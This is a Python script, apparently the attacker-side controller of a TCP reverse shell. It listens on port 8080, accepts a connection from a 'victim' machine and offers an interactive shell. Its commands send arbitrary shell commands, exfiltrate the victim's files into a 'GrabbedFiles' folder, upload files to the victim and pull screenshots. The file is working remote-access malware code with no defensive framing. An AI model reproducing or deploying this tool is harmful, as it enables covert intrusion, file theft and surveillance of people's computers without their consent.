import os
import socket
import datetime

# initiates grabbing a file from the victim's machine
def doGrab(conn, command):

    # send the encoded command over the socket connection
    conn.send(command.encode())

    #for grab operation, open a file in write mode, inside GrabbedFiles folder
    #File name should be of format: grabbed_sourceFilePathOfClientMachine
    #File name example: grabbed_C:/Users/John/Desktop/audit.docx

    # grab command uses '*' as delimiter
    grab, sourcePathAsFileName = command.split("*")

    # define the path to put the grabbed files in and create the filename
    path = "/home/kali/Desktop/GrabbedFiles/"
    fileName = "grabbed_" + sourcePathAsFileName

    # open the newly defined file and begin writing
    f = open(path + fileName, "wb")

    # begin a loop to receive the packets from the victim's machine
    while True:
        # create a packet of the received bits
        bits = conn.recv(5000)

        # check to see if the packet ends with the DONE flag
        if bits.endswith('DONE'.encode()):

            # if it does, write those last received bits without the word 'DONE'
            f.write(bits[:-4])

            # close the file and end the loop
            f.close()
            print('[+] File transfer completed')
            break

        if 'File not found'.encode() in bits:
            print ("[-] Unable to find the file")
            break

        # write the bits to the file
        f.write(bits)
        
    print("File name: " + fileName)
    print("Written to: " + path)

# initiates sending a file to the victim's machine
def doSend(conn, sourcePath, destinationPath, fileName):

    # for 'send' operation, open the file in read mode
    # read the file into packets and send them through the connection object
    # after finished sending the whole file, send string 'DONE' to indicate completion
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, "rb")
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print("[+] File transfer completed")
    else:
        conn.send("File not found".encode())
        print("[-] Unable to find the file")
        return

# allows for the transfer of screenshots
def transfer(conn, command):
    conn.send(command.encode())

    # creates a unique filename with the current datetime
    fileName = "screenCapture"+ str(datetime.datetime.now()) + ".jpg"

    # open the file for writing
    f = open('/home/kali/Desktop/'+fileName, 'wb')

    # receive and write packets until the DONE flag is found
    while True:
        bits = conn.recv(5000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] File not found')
            break
        f.write(bits)

    print("File written to: /home/kali/Desktop/")

# initialize and begin listening for incoming connections from the victim
def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(1)
    print("="*60)
    print("    TCP REVERSE SHELL")
    print("="*60)
    print("[+] Listening for incoming TCP connections on port 8080")
    conn, addr = s.accept()
    print("[+] Connected to", addr)

    # handle user input and shell commands
    while True:
        print("="*60)
        command = input("Shell> : ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break

        #command format: grab*<File Path>
        #example: grab*C:\Users\John\Desktop\photo.jpg
        elif 'grab' in command:
            doGrab(conn, command)

        #command format: send*<destination path>*<File name>
        #example: send*C:\Users\John\Desktop\*photo.jpeg
        #source file in linux. Example: /Root/Desktop
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)
        elif 'screencap' in command:
            transfer(conn, command)

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()

if __name__ == "__main__":
    main()
